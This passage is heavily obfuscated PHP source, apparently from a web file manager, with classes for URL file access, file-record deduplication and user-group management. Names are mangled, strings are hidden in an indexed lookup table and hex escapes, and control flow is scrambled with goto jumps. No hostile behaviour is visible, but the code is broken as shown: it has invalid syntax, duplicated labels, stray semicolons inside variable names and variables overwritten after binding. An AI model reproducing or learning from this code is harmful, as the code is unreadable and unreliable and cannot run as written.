$bȸ瓽[$Fߪ[1343]]; return $bȸ瓽; goto eξ; eξ: } protected function _isFolder($fĭ) { $bݝ֒ =& $_SERVER[]; if ($fĭ == $bݝ֒[33] || $fĭ == $bݝ֒[8]) { return !0; } $cᣐ = $this->_objectMeta($fĭ); return isset($cᣐ[$bݝ֒[29]]) && $cᣐ[$bݝ֒[29]] == $bݝ֒[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($a䗒 = false) { } public function exist($fǖ) { $dȵܬ = $this->info($fǖ); return $dȵܬ[$_SERVER[][195]]; } public function isFile($Bڌڋ) { $b = $this->info($Bڌڋ); return $b[$_SERVER[][195]]; } public function isFolder($cռ) { return !1; } public function size($c㍅) { $b = $this->info($c㍅); return $b[$_SERVER[][78]]; } public function info($f곘) { return $this->infoParse($f곘); } public function infoAuth($Aﱶ) { return $this->infoParse($Aﱶ); } public function infoWithChildren($Aϣ֡) { return $this->infoParse($Aϣ֡); } public function infoFull($c煉) { return $this->infoParse($c煉); } private function infoParse($eƇ) { $B =& $_SERVER[]; $A = $this->header($eƇ); if (!$A || !$A[$B[715]]) { return !1; } $DŠ = _get($A, $B[335], 0); $e = array($B[28] => $A[$B[28]], $B[76] => $eƇ, $B[29] => $B[193], $B[78] => intval($DŠ), $B[168] => get_path_ext($A[$B[28]]), $B[1259] => $DŠ > 0 && $A[$B[1379]], $B[1260] => !1); return $e; } private function header($c) { goto B; B: $a˷ =& $_SERVER[]; if (isset(self::$_cacheHeader[$c])) { return self::$_cacheHeader[$c]; } $a = isset($GLOBALS[$a˷[1380]]) ? $GLOBALS[$a˷[1380]] : !1; goto AԄ; a: return self::$_cacheHeader[$c]; goto Cޕ; AԄ: $GLOBALS[$a˷[1380]] = !0; self::$_cacheHeader[$c] = url_header($c); $GLOBALS[$a˷[1380]] = $a; goto a; Cޕ: } public function hashSimple($F, $Dƺ봙 = false) { goto fܹ饋; F킖: $c = timeFloat(); $f = 15; for ($c = 0; $c < $a; $c++) { if (timeFloat() - $c > $f) { return !1; } $fԵ = $this->fileSubstr($F, $E * $c, $Aֽ); if (!$fԵ) { return !1; } $dڏ .= $fԵ; } goto Aә; Aә: $dڏ .= $this->fileSubstr($F, $eۮ - $Aֽ, $Aֽ); return md5($dڏ) . $eۮ; goto eߦ; BƎ: if ($eۮ <= $Aֽ * $a) { return md5($this->fileSubstr($F, 0, $eۮ)) . $eۮ; } $E = intval($eۮ / $a); $dڏ = $d͞[33]; goto F킖; e: $eۮ = $fܱ[$d͞[78]]; $Aֽ = 200; $a = 50; goto BƎ; fܹ饋: $d͞ =& $_SERVER[]; $fܱ = $this->info($F); if (!$fܱ || !$fܱ[$d͞[195]]) { return !1; } goto e; eߦ: } public function getContent($d﬑) { return $this->fileSubstr($d﬑); } public function fileSubstr($bẌǯ, $d = 0, $c֜ = -1) { goto a; a: $d =& $_SERVER[]; $d = $this->info($bẌǯ); if (!$d || !$d[$d[195]] && $d[$d[78]] > 1024 * 1024 * 10) { return !1; } goto a˕; eΧ: $e = url_request($bẌǯ, $d[228], !1, $a, !1, !1, 1); return $e[$d[1091]] ? $e[$d[1091]] : $d[33]; goto Fָ; a˕: if ($c֜ === -1) { $c֜ = $d[$d[78]]; } if ($c֜ == 0) { return $d[33]; } $a = array($d[1381] . $d . $d[749] . ($d + $c֜ - 1)); goto eΧ; Fָ: } public function download($Bۼ, $eĭ) { Downloader::start($Bۼ, $eĭ); return $eĭ; } } goto dϊ󳅏; D؝: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\154\x65"; protected $tableMeta = array("\x74\x61\142\x6c\145\x4e\x61\x6d\x65" => "\151\157\137\146\x69\154\145\x5f\155\145\164\x61", "\x6d\x65\x74\141\x46\x69\x65\x6c\144" => "\146\x69\154\x65\111\x44"); public function fileInfo($c֮) { $D걅 =& $_SERVER[]; static $bҬ = array(); if (!isset($bҬ[$c֮])) { $B = $D걅[1746]; $d᳘ = Model($D걅[450])->field($B)->where(array($D걅[448] => $c֮))->find(); $bҬ[$c֮] = $d᳘; } return $bҬ[$c֮]; } public function addFileByContent($dЂ = '', $E = '') { goto bۢ; bۢ: $E =& $_SERVER[]; $B = TEMP_PATH . $E[1747]; if (!is_dir($B)) { mk_dir($B); } goto C; eވ: if (file_exists($eȢ)) { @unlink($eȢ); } return $C넞; goto e̻; C: $eȢ = $B . $E[1748] . rand_string(16); file_put_contents($eȢ, $dЂ); $C넞 = $this->addFile($eȢ, $E, !0); goto eވ; e̻: } public function createFileName($C缼, $aֶ = false, $bҕ೧ = false) { goto e; e: $fۺυ =& $_SERVER[]; $bĊ = IO::init($fۺυ[8]); $fʠ = $this->makeFilePath($C缼, $bĊ, $aֶ, $bҕ೧); goto F㩪; E: if (!$B쩍 && !Cache::get($cۻ)) { $B쩍 = !0; $bۄ = IO::mkdir($A𛞷); if (!IO::exist($bۄ . $fۺυ[766])) { IO::mkfile($bۄ . $fۺυ[766]); } Cache::set($cۻ, 1, 3600 * 2); } return $fʠ; goto B; F㩪: $A𛞷 = $bĊ->pathFather($fʠ); static $B쩍 = false; $cۻ = $fۺυ[1749] . md5($A𛞷); goto E; B: } public function makeFilePath($B, $D͚ȏ, $E = false, $Fʆ = false) { goto A; Cع: if (!$B) { $Bԃ = $a[1752]; } switch ($Bԃ) { case $a[1753]: $Bׄ = $Bׄ . $a[95] . $D͚ȏ->ext($B); if ($AǍ == $a[1692]) { $Bׄ .= $a[1432]; } break; case $a[1754]: goto Dإ; F: $Aݖ = $a[1127] . $b΢[$a[393]] . $a[402] . date($a[1755]) . $D . $a[8]; if ($AǍ == $a[1692]) { $B .= $a[1432]; } $fû = $a[1756] . $Aݖ . $B; goto c; Dإ: $Fñ = Model($a[735])->get($a[736]); $D = substr(md5($a[737] . $Fñ . date($a[713])), 0, 8); $b΢ = KodIO::defaultDriver(); goto F; c: CacheLock::lock($fû); $Bׄ = $Aݖ . $B; if (IO::exist($Aݖ . $B)) { $Fㄓ = substr($B, 0, strlen($B) - strlen($AǍ)); $dܓ = $Fʆ ? substr($Fʆ, 0, 5) : ($E ? substr($E, 0, 5) : rand_string(5)); $Bׄ = $Aݖ . $Fㄓ . $dܓ . $a[95] . $AǍ; } goto dɪȪ; dɪȪ: if (IO::isTypeObject($Bׄ) && !IO::isUploadServer($Bׄ)) { if (IO::exist($Bׄ)) { return $Bׄ; } $dӸ݊ = IO::setContent($Bׄ, $a[33]); if (!$dӸ݊) { show_json($a[1757], !1); } } CacheLock::unlock($fû); break; goto b; b: case $a[1752]: break; default: break; } return $Bׄ; goto Eฦ̏; D˓ђ: $Bׄ = $Aݖ . rand_string(5) . short_id(100); $B = str_replace($a[8], $a[71], KodIO::clear($B)); $AǍ = $D͚ȏ->ext($B); goto Cع; A: $a =& $_SERVER[]; $Bԃ = Model($a[735])->get($a[1750]); $Aݖ = KodIO::defaultIO() . date($a[1751]); goto D˓ђ; Eฦ̏: } public function addFileByRemote($dɑ, $A, $dы = array()) { goto F浣; F: if ($bʇ׉ = $this->addFileCheckExist($D߬״Ɗ[$A[171]], $D߬״Ɗ[$A[170]], $D߬״Ɗ[$A[78]])) { return $bʇ׉; } return $this->addFileData($D߬״Ɗ); goto CЉۊ݊; F浣: $A =& $_SERVER[]; if (!IO::exist($dɑ)) { return !1; } $B = $dы[$A[170]] ? $dы[$A[170]] : $A[33]; goto A; A: $B = IO::hashMd5($dɑ, $B); $C = KodIO::defaultDriver(); $D߬״Ɗ = array($A[561] => IO::size($dɑ), $A[1758] => 1, $A[413] => $A, $A[778] => $C[$A[393]], $A[414] => $dɑ, $A[1759] => $dы[$A[171]] ? $dы[$A[171]] : IO::hashSimple($dɑ), $A[1760] => $B ? $B : $B); goto F; CЉۊ݊: } private function addFileData($Fȑ) { $a =& $_SERVER[]; if (!$Fȑ) { return !1; } $Fȑ[$a[78]] = intval($Fȑ[$a[78]]); if (!$Fȑ[$a[78]] && strlen($Fȑ[$a[171]]) > 32) { $Fȑ[$a[78]] = intval(substr($Fȑ[$a[171]], 32)); } $D = $this->add($Fȑ); return $this->find($D); } public function addFile($Eޑ˺, $c܆, $d𓨑 = false) { goto fօ; C: $A = $this->addFileMake($Eޑ˺, $B㋘, $Dӝ硨, $d, $c܆, $d𓨑); $Dȃ = $this->addFileData($A); CacheLock::unlock($C٩); goto C; fօ: $Dӝ硨 = IO::hashSimple($Eޑ˺); $d = IO::hashMd5($Eޑ˺); $B㋘ = IO::size($Eޑ˺); goto fђ; C: return $Dȃ; goto dӿ; fђ: $C٩ = $_SERVER[][1761] . $d; CacheLock::lock($C٩); if ($dܨ = $this->addFileCheckExist($Dӝ硨, $d, $B㋘)) { CacheLock::unlock($C٩); return $dܨ; } goto C; dӿ: } public function addFileMake($Fܱ, $a, $F, $Dߢݪ, $B؃, $Bٖ΅) { goto E; Bމ°: $Cָ = KodIO::defaultDriver(); $CԤ = array($AΎ[561] => $a, $AΎ[1758] => 1, $AΎ[413] => $B؃, $AΎ[778] => $Cָ[$AΎ[393]], $AΎ[414] => $dݘڍɂ, $AΎ[1759] => $F, $AΎ[1760] => $Dߢݪ); return $CԤ; goto Ë́; DЉ: $eꌥ = get_path_this($dݘڍɂ); if ($Bٖ΅) { $FګѬ = IO::move($Fܱ, $aׅ½, !1, $eꌥ); } else { $FګѬ = IO::copy($Fܱ, $aׅ½, !1, $eꌥ); } if (!$FګѬ) { return !1; } goto Bމ°; E: $AΎ =& $_SERVER[]; $dݘڍɂ = $this->createFileName($B؃, $F, $Dߢݪ); $aׅ½ = get_path_father($dݘڍɂ); goto DЉ; Ë́: } public function addFileCheckExist($cƉ, $A򃾱, $E) { $Dķ =& $_SERVER[]; $D͖ = $this->findByHash($cƉ, $A򃾱); if (!$D͖) { return !1; } $a = array($Dķ[1758] => intval($D͖[$Dķ[1762]]) + 1, $Dķ[561] => $E); $this->where(array($Dķ[448] => $D͖[$Dķ[447]]))->save($a); return $D͖; } public function remove($fґ) { $this->linkCountChange($fґ, !1); $this->clearEmpty(); return !0; } public function linkAdd($a) { $this->linkCountChange($a, !0); } public function linkCountChange($Bև, $Aƹ) { goto D땺; D땺: $d˂׈ =& $_SERVER[]; if (!$Bև) { return; } if (!is_array($Bև)) { $Bև = array($Bև); } goto A±; A±: $Eåߨ = array(); foreach ($Bև as $EӺ) { $C = $EӺ . $d˂׈[33]; if (!$Eåߨ[$C]) { $Eåߨ[$C] = 0; } $Eåߨ[$C]++; } $fߢ = array(); goto bׯ槈; bׯ槈: foreach ($Eåߨ as $EӺ => $e) { $C = $e . $d˂׈[33]; if (!$fߢ[$C]) { $fߢ[$C] = array(); } $fߢ[$C][] = $EӺ; } foreach ($fߢ as $e => $fۂ) { if (!$fۂ) { continue; } $e = $Aƹ ? $e : -intval($e); $bܒ = array($d˂׈[447] => array($d˂׈[7], $fۂ)); if ($e < 0) { $bܒ[$d˂׈[1762]] = array($d˂׈[974], abs($e)); } $this->where($bܒ)->setAdd($d˂׈[1762], $e); } goto b񶰷; b񶰷: } public function findByHash($Aօ̻, $aѕʋ = false) { $d =& $_SERVER[]; if (!$Aօ̻ && !$aѕʋ) { return !1; } $Fũ = array($d[1759] => $Aօ̻); if ($aѕʋ) { $Fũ = array($d[1760] => $aѕʋ); } return $this->order($d[1763])->where($Fũ)->find(); } public function clearEmpty($b㆖ = 0) { goto E; dÈ͈: $F = $this->where($D➛)->select(); if (!$F) { return; } $EЧ = new Task($e[1765], $e[33], count($F)); goto B􎥢; B􎥢: foreach ($F as $a뮍֡) { $EЧ->update(1); $this->resetFile($a뮍֡); } $EЧ->end(); goto fƚ; E: $e =& $_SERVER[]; $FƄĹߡ = time() - 3600 * 24 * $b㆖; $D➛ = $e[1764] . $FƄĹߡ; goto dÈ͈; fƚ: } public function resetFile($bʒ) { goto BֵЄ; BӍ: $eϕ = Model($A[1766])->where($bܞ)->count(); $D = intval($f) + intval($eϕ); if ($D == 0) { IO::remove($bʒ[$A[76]]); Model($A[1767])->delete($bʒ[$A[447]]); $this->where($bܞ)->delete(); $this->metaSet($bʒ[$A[447]], null, null); return; } goto Dǟ; BֵЄ: $A =& $_SERVER[]; $bܞ = array($A[448] => $bʒ[$A[447]]); $f = Model($A[1209])->where($bܞ)->count(); goto BӍ; Dǟ: if ($bʒ[$A[1762]] != $D) { $this->where($bܞ)->save(array($A[1758] => $D)); } goto aĔôǐ; aĔôǐ: } public function storageInfo($bܼǾ = false) { goto a߬ޝϙ; a߬ޝϙ: $AǮ =& $_SERVER[]; $e = $this->count() + 0.0; $e = 0; goto aՈ; aՈ: $aʑ = 1; $aˆӿ = 0; $EȺ = 5000; goto D; D: for ($c = 0; $c < $e; $c = $c + $EȺ) { $d = $this->limit($c, $c + $EȺ)->select(); foreach ($d as $A) { $aʑ += $A[$AǮ[78]] * $A[$AǮ[1762]]; $e += $A[$AǮ[78]] * ($A[$AǮ[1762]] - 1); $aˆӿ += $A[$AǮ[1762]]; } } $b = array($AǮ[1768] => $aʑ, $AǮ[1769] => $e, $AǮ[1770] => $e / $aʑ, $AǮ[82] => $e, $AǮ[1771] => $aˆӿ); return $b; goto fˑ; fˑ: } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\165\x70"; protected $tableMeta = array("\x74\141\x62\x6c\x65\116\x61\x6d\x65" => "\147\162\157\x75\x70\137\155\145\164\x61", "\x6d\145\x74\141\106\x69\x65\154\144" => "\147\162\x6f\x75\x70\111\x44"); protected function cacheFunctionAlias($fő) { $E൯ =& $_SERVER[]; return array($E൯[1772] => array($fő[0], $E൯[1773]), $E൯[1774] => array($fő[0], $E൯[1773])); } protected function getInfo($b㦈) { $fǮ = $this->getInfoSimple($b㦈); if (!$fǮ) { return !1; } return $this->_listDataApplyItem($fǮ); } protected function getInfoSimple($F՗, $Fϴ = false) { $Bʃ =& $_SERVER[]; if ($Fϴ) { $d̹Տ = array($Bʃ[1702] => intval($F՗)); $f = $this->where($d̹Տ)->find(); return is_array($f) ? $f : array(); } return $this->cacheFunctionGet($Bʃ[1775], $F՗); } protected function groupAdd($d⎻) { goto A度; A度: $Fҝ =& $_SERVER[]; if (!$d⎻[$Fҝ[478]] && isset($d⎻[$Fҝ[1702]]) && $d⎻[$Fҝ[1702]] == 1) { if ($a = $this->getInfoSimple($d⎻[$Fҝ[1702]], !0)) { return $d⎻[$Fҝ[1702]]; } } else { $a = $this->getInfoSimple($d⎻[$Fҝ[478]]); if (!$a) { return !1; } } $eҤ = $Fҝ[512]; goto eҠ; eҠ: if ($a[$Fҝ[502]]) { $eҤ = $a[$Fҝ[502]] . $a[$Fҝ[1702]] . $Fҝ[47]; } $Cё = array($Fҝ[413] => $this->groupNameAuto($d⎻[$Fҝ[478]], $d⎻[$Fҝ[28]]), $Fҝ[394] => $d⎻[$Fҝ[478]], $Fҝ[566] => $eҤ, $Fҝ[1776] => $d⎻[$Fҝ[1686]], $Fҝ[1777] => 0, $Fҝ[1706] => 0); if (isset($d⎻[$Fҝ[1725]])) { $Cё[$Fҝ[1725]] = $d⎻[$Fҝ[1725]]; } else { $Dٹ = $this->max($Fҝ[1725]); if (!$Dٹ) { $Dٹ = 0; } $Cё[$Fҝ[1725]] = $Dٹ + 1; } goto aݕ; aݕ: if (!empty($d⎻[$Fҝ[1702]])) { $Cё[$Fҝ[1702]] = $d⎻[$Fҝ[1702]]; } $C󶛰 = $this->add($Cё); $this->setNamePinyin($C󶛰, $Cё[$Fҝ[28]]); goto bʮ; bʮ: if (isset($d⎻[$Fҝ[1778]])) { $this->metaSet($C󶛰, array($Fҝ[1778] => $d⎻[$Fҝ[1778]], $Fҝ[1779] => $d⎻[$Fҝ[1779]])); unset($d⎻[$Fҝ[1778]]); unset($d⎻[$Fҝ[1779]]); } Model($Fҝ[1209])->groupRootAdd($C󶛰); return $C󶛰; goto bō; bō: } protected function groupEdit($Bݭĩ, $c茿) { goto F; dӚ: if (isset($c茿[$B֗[28]]) && $c茿[$B֗[28]] != $BǴ̹[$B֗[28]]) { $this->_clearChildrenCache($BǴ̹); } return $this->where(array($B֗[1780] => $Bݭĩ))->save($c茿); goto d; e: if (!empty($c茿[$B֗[478]])) { $c = $this->getInfoSimple($c茿[$B֗[478]]); if (!$c) { return !1; } if ($BǴ̹[$B֗[1702]] == $c[$B֗[1702]]) { return !1; } if ($c茿[$B֗[478]] != $BǴ̹[$B֗[478]]) { if ($c[$B֗[502]] !== $BǴ̹[$B֗[502]] && strpos($c[$B֗[502]], $BǴ̹[$B֗[502]] . $BǴ̹[$B֗[1702]] . $B֗[47]) === 0) { return !1; } $c茿[$B֗[566]] = $c[$B֗[502]] . $c茿[$B֗[478]] . $B֗[47]; $this->_changeChildLevel($BǴ̹, $c); } } if (isset($c茿[$B֗[28]])) { $this->setNamePinyin($Bݭĩ, $c茿[$B֗[28]]); } if (isset($c茿[$B֗[1778]])) { $this->metaSet($Bݭĩ, array($B֗[1778] => $c茿[$B֗[1778]], $B֗[1779] => $c茿[$B֗[1779]])); unset($c茿[$B֗[1778]]); unset($c茿[$B֗[1779]]); } goto dӚ; F: $B֗ =& $_SERVER[]; $BǴ̹ = $this->getInfoSimple($Bݭĩ); if (!$BǴ̹) { return !1; } goto e; d: } private function _clearChildrenCache($eئ) { $e =& $_SERVER[]; $b⪜ = array($e[566] => array($e[525], $eئ[$e[502]] . $eئ[$e[1702]] . $e[526])); $d뵅 = $this->field($e[1702])->where($b⪜)->select(); foreach ($d뵅 as $dɎ) { $this->cacheFunctionClear($e[1781], $dɎ[$e[1702]]); $this->cacheFunctionClear($e[1775], $dɎ[$e[1702]]); } } private function _changeChildLevel($d, $fۥڛ, $B = false) { goto C͈ܭ; C͈ܭ: $A =& $_SERVER[]; $Aۿꩰ = $d[$A[502]] . $d[$A[1702]] . $A[47]; $cٿ = $fۥڛ[$A[502]] . $fۥڛ[$A[1702]] . $A[47] . $d[$A[1702]] . $A[47]; goto Dȉ; aᎴ: $this->_clearChildrenCache($d); $this->where($fᓽ)->data($cً)->save(); goto bךô; Dȉ: if ($B) { $cٿ = $fۥڛ[$A[502]] . $fۥڛ[$A[1702]] . $A[47]; } $fᓽ = array($A[566] => array($A[525], $d[$A[502]] . $d[$A[1702]] . $A[526])); $cً = array($A[566] => array($A[574], "\x72\145\x70\154\141\x63\145\50\x70\141\x72\x65\x6e\164\x4c\145\166\x65\154\54\x27{$Aۿꩰ}\47\54\47{$cٿ}\x27\x29")); goto aᎴ; bךô: } public function setNamePinyin($A˂, $cл = false) { $F =& $_SERVER[]; if (!$cл) { $bά = $this->getInfoSimple($A˂); $cл = $bά[$F[28]]; } if (!Input::check($cл, $F[569])) { $this->metaSet($A˂, $F[444], null); $this->metaSet($A˂, $F[443], null); return; } $ců蔡 = array($F[444] => str_replace($F[50], $F[33], Pinyin::encode($cл)), $F[443] => Pinyin::encode($cл, $F[570])); $this->metaSet($A˂, $ců蔡); } protected function groupStatus($e, $e) { goto EѪЌ; EѪЌ: $a =& $_SERVER[]; $A = $this->getInfoSimple($e); if (!$A) { return !1; } goto cԔ; cԔ: if ($e == $a[87]) { $Eڒ = $this->parentLevelArray($A[$a[502]]); } else { $DΆ = array($a[566] => array($a[525], $A[$a[502]] . $A[$a[1702]] . $a[526])); $Eڒ = $this->where($DΆ)->field($a[1702])->select(); $Eڒ = array_to_keyvalue($Eڒ, $a[33], $a[1702]); } $Eڒ[] = $A[$a[1702]]; $DԈ = array(); goto bɂ; bɂ: foreach ($Eڒ as $e) { $DԈ[] = array($a[1702] => $e, $a[93] => $a[715], $a[372] => $e); } return Model($a[1782])->addAll($DԈ, array(), !0); goto d; d: } protected function groupRemove($fć) { goto a; a: $a񢱼 =& $_SERVER[]; $Fӑ = array($a񢱼[1702] => $fć); $a = $this->where($Fӑ)->find(); goto cެ; cެ: if (!$a || $a[$a񢱼[478]] == 0) { return !1; } $BՉ = $this->getInfoSimple($a[$a񢱼[478]]); $this->_changeChildLevel($a, $BՉ, !0); goto b; EÅؐ: Model($a񢱼[795])->groupRootRemove($fć); return $this->where($Fӑ)->delete(); goto D粂; b: $this->where(array($a񢱼[478] => $fć))->save(array($a񢱼[478] => $a[$a񢱼[478]])); Model($a񢱼[1782])->where($Fӑ)->delete(); Model($a񢱼[1783])->where($Fӑ)->delete(); goto EÅؐ; D粂: } protected function groupSort($bߎɌ) { $Bღ =& $_SERVER[]; $EͿ = array(); foreach ($bߎɌ as $B쭎΄ => $eų҈) { $EͿ[] = array($Bღ[1702], $eų҈, $Bღ[1725], $B쭎΄ + 1); } $this->saveAll($EͿ); } public function listData() { $Eߨ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Eߨ[$_SERVER[][367]]); return $Eߨ; } private function _makeOrder($D = '') { goto e; e: $Fڢ =& $_SERVER[]; $B = array($Fڢ[1702], $Fڢ[28], $Fڢ[1688], $Fڢ[194]); $c = array($Fڢ[428] => $Fڢ[429], $Fڢ[430] => $Fڢ[431]); goto F; f̓: $D = $D . "{$E}\40{$Dܻ}\54\x20\147\162\157\x75\x70\x49\104\x20\x61\x73\143"; return $this->order($D); goto E; F: $E = Input::get($Fڢ[435], $Fڢ[7], $Fڢ[1706], $B); $Dܻ = Input::get($Fڢ[436], $Fڢ[7], $Fڢ[1784], array($Fڢ[1784], $Fڢ[430])); $Dܻ = $c[$Dܻ]; goto f̓; E: } public function listChild($E℔) { $c֕Ѓ =& $_SERVER[]; $bܞ = $this->where(array($c֕Ѓ[478] => $E℔))->_makeOrder()->selectPage(200); $this->_listDataApply($bܞ[$c֕Ѓ[367]]); return $bܞ; } public function listByID($E׋) { $A =& $_SERVER[]; if (!$E׋) { return array(); } $b = array($A[1702] => array($A[7], $E׋)); $Dキ = $this->where($b)->select(); $this->_listDataApply($Dキ); return $Dキ; } public function listSearch($Aߎ) { goto Eȼ; Eʣ: if (!trim($Dꄄ)) { return !1; } $Dꄄ = str_replace($F[1787], $F[1788], $Dꄄ); $c띇 = array($F[1702] => array($F[380], "{$Dꄄ}\x25"), $F[28] => array($F[380], "\45{$Dꄄ}\x25"), $F[959] => $F[1789]); goto E; E: if ($eӪ;) { $Eź = $this->getInfoSimple($eӪ;); $F = $Eź[$F[502]] . $eӪ; . $F[526]; $c띇 = array($c띇, array($F[502] => array($F[380], $F))); } $c띇 = $this->parseWhereLike($c띇); $B = $this->_makeOrder()->where($c띇)->selectPage(20); goto Aȉ; Aȉ: $B = $B ? $B : array($F[367] => array(), $F[364] => array()); if (!$B || count($B[$F[367]]) < 5 && Input::check($Dꄄ, $F[316])) { goto Fʫ; Fģ: $a򫼸 = array_merge($eߺף, $F, $B[$F[367]]); $B[$F[367]] = array_unique_by_key($a򫼸, $F[1702]); $B[$F[364]][$F[365]] = count($B[$F[367]]); goto c; c: $B[$F[364]][$F[366]] = ceil($B[$F[364]][$F[365]] / $B[$F[364]][$F[361]]); goto aǛ; Fʫ: $d唷 = $this->groupChildrenAll($eӪ;); $eߺף = $this->_searchFromMeta($F[443], $Dꄄ, 10, $d唷); $F = $this->_searchFromMeta($F[444], $Dꄄ, 10, $d唷); goto Fģ; aǛ: } $this->_listDataApply($B[$F[367]]); goto E; Eȼ: $F =& $_SERVER[]; $Dꄄ = $Aߎ[$F[1785]]; $eӪ; = isset($Aߎ[$F[1786]]) ? $Aߎ[$F[1786]] : !1; goto Eʣ; E: return $B; goto e׷; e׷: } protected function groupChildrenAll($Bʂ) { $D떕 =& $_SERVER[]; if (!$Bʂ) { return !1; } if (is_string($Bʂ)) { $Bʂ = array($Bʂ); } $Cǉ޶ = $Bʂ; foreach ($Bʂ as $c) { $D٢ = $this->getInfoSimple($c); $dޱ = array($D떕[502] => array($D떕[380], $D٢[$D떕[502]] . $c . $D떕[526])); $f摚 = $this->field($D떕[1702])->where($dޱ)->select(); $Cǉ޶ = array_merge($Cǉ޶, array_to_keyvalue($f摚, $D떕[33], $D떕[1702])); } return array_unique($Cǉ޶); } private function _searchFromMeta($C܎܈, $bǙҿ, $b, $F) { goto Cߵ; C̶: if (!$B) { return array(); } return $B; goto F͓Ǟ; Eˉ: $DØ = $this->parseWhereLike($DØ); if ($F) { $DØ[$CÍ[1702]] = array($CÍ[7], $F); } $f˫ = Model($CÍ[1790])->where($DØ)->limit($b)->select(); goto cƐط; Cߵ: $CÍ =& $_SERVER[]; $bǙҿ = strtolower($bǙҿ); $DØ = array($CÍ[93] => $C܎܈, $CÍ[372] => array($CÍ[380], "\x25{$bǙҿ}\x25")); goto Eˉ; cƐط: if (!$f˫) { return array(); } $f˫ = array_to_keyvalue($f˫, $CÍ[33], $CÍ[1702]); $B = $this->where(array($CÍ[1780] => array($CÍ[7], $f˫)))->select(); goto C̶; F͓Ǟ: } protected function _listDataApplyItem($a鼉) { $Cح = array($a鼉); $this->_listDataApply($Cح); return $Cح[0]; } protected function _listDataApply(&$EɃ) { goto C; BԷ: $this->_listAppendChildren($EɃ); $this->_listAppendChildrenMember($EɃ); $this->_listAppendMeta($EɃ, $C͌); goto E˶; C: $cĺ =& $_SERVER[]; if (!$EɃ) { return; } $C͌ = array_to_keyvalue($EɃ, $cĺ[33], $cĺ[1702]); goto BԷ; E˶: $this->_listAppendParent($EɃ); $this->_listAppendSourceRoot($EɃ, $C͌); goto c; c: } private function _listAppendChildren(&$c) { goto e喝; d惧Ç: $dѹ = array($Dҳ[478], $Dҳ[1791] => $Dҳ[480]); $b = $this->field($dѹ)->where($aμ)->group($Dҳ[478])->select(); $B垅ը = array_to_keyvalue($b, $Dҳ[478], $Dҳ[480]); goto e; e喝: $Dҳ =& $_SERVER[]; $d = array_to_keyvalue($c, $Dҳ[33], $Dҳ[1702]); $aμ = array($Dҳ[478] => array($Dҳ[7], $d)); goto d惧Ç; e: foreach ($c as &$a) { $Dה = $a[$Dҳ[1702]]; $a[$Dҳ[1792]] = isset($B垅ը[$Dה]) ? intval($B垅ը[$Dה]) : !1; } unset($a); goto cΐ; cΐ: } private function _listAppendChildrenMember(&$F߭) { goto dǒԄ; F: $a瑴 = array($d[1702], $d[1791] => $d[480]); $dڵܟ = Model($d[1783])->field($a瑴)->where($e蠪)->group($d[1702])->select(); $f  = array_to_keyvalue($dڵܟ, $d[1702], $d[480]); goto CȂÓ; CȂÓ: foreach ($F߭ as &$dǵ) { $a٭ = $dǵ[$d[1702]]; $dǵ[$d[1793]] = isset($f [$a٭]) ? intval($f [$a٭]) : !1; } unset($dǵ); goto e; dǒԄ: $d =& $_SERVER[]; $F = array_to_keyvalue($F߭, $d[33], $d[1702]); $e蠪 = array($d[1702] => array($d[7], $F)); goto F; e: } private function _listAppendMeta(&$A皭, $Eٲ) { goto d; e: $Cۑ = array_to_keyvalue_group($Cۑ, $BՒ՚[1702]); foreach ($Cۑ as &$eǅ) { $eǅ = array_to_keyvalue($eǅ, $BՒ՚[93], $BՒ՚[372]); } unset($eǅ); goto c; d: $BՒ՚ =& $_SERVER[]; $e = array($BՒ՚[1702] => array($BՒ՚[7], $Eٲ)); $Cۑ = Model($BՒ՚[1782])->where($e)->select(); goto e; c: foreach ($A皭 as &$F̓) { $F̓[$BՒ՚[445]] = array(); if (isset($Cۑ[$F̓[$BՒ՚[1702]]])) { $F̓[$BՒ՚[445]] = $Cۑ[$F̓[$BՒ՚[1702]]]; } } unset($F̓); goto E͞ɷ; E͞ɷ: } protected function parentLevelArray($a٣) { $eസ =& $_SERVER[]; $a٣ = explode($eസ[47], trim($a٣, $eസ[47])); $a٣ = array_remove_value($a٣, $eസ[191]); return $a٣; } private function _listAppendParent(&$E̫) { goto a󤂰; d֪܎: if ($GLOBALS[$d׸ِ[485]] == $d׸ِ[87]) { $B = !1; } foreach ($E̫ as &$dɏ) { $D焓 = $this->parentLevelArray($dɏ[$d׸ِ[502]]); $cď = $d׸ِ[33]; foreach ($D焓 as $bͤ => $D) { if ($B && $bͤ == 0) { continue; } $cď .= $c̓[$D] . $d׸ِ[8]; } if ($D焓) { $cď .= $dɏ[$d׸ِ[28]]; } $dɏ[$d׸ِ[507]] = str_replace($d׸ِ[510], $d׸ِ[8], $cď); } unset($dɏ); goto fɷ̆; a󤂰: $d׸ِ =& $_SERVER[]; $c̓ = array(); foreach ($E̫ as &$dɏ) { $c̓[$dɏ[$d׸ِ[1702]]] = $dɏ[$d׸ِ[28]]; $D焓 = $this->parentLevelArray($dɏ[$d׸ِ[502]]); foreach ($D焓 as $D) { if (!isset($c̓[$D])) { $c̓[$D] = 0; } } } goto fяÇ; fяÇ: unset($dɏ); foreach ($c̓ as $bͤ => $A) { if ($A) { continue; } $b = $this->getInfoSimple($bͤ); $c̓[$bͤ] = $b[$d׸ِ[28]]; } $B = $GLOBALS[$d׸ِ[6]][$d׸ِ[88]][$d׸ِ[1794]]; goto d֪܎; fɷ̆: } private function _listAppendSourceRoot(&$d®⚡, $D艦) { goto fܠ; Eۄ: foreach ($d®⚡ as &$bҘ) { $bҘ[$Aϴ[85]] = $Fܧ[$bҘ[$Aϴ[1702]]] ? $Fܧ[$bҘ[$Aϴ[1702]]] : array(); } unset($bҘ); goto cֺ; fܠ: $Aϴ =& $_SERVER[]; $D = array($Aϴ[404] => SourceModel::TYPE_GROUP, $Aϴ[478] => 0, $Aϴ[484] => array($Aϴ[7], $D艦)); $aц = $Aϴ[1795]; goto D뇦; D뇦: $Fܧ = Model($Aϴ[795])->order($Aϴ[1796])->field($aц)->where($D)->select(); $Fܧ = array_to_keyvalue($Fܧ, $Aϴ[484]); $Fܧ = array_remove_key($Fܧ, $Aϴ[484]); goto Eۄ; cֺ: } protected function groupMerge($a┭е) { $a┭е = array_values(array_unique($a┭е)); $C = array(); for ($E = 0; $E < count($a┭е); $E++) { $cҮ = !1; for ($cЯ亄 = 0; $cЯ亄 < count($a┭е); 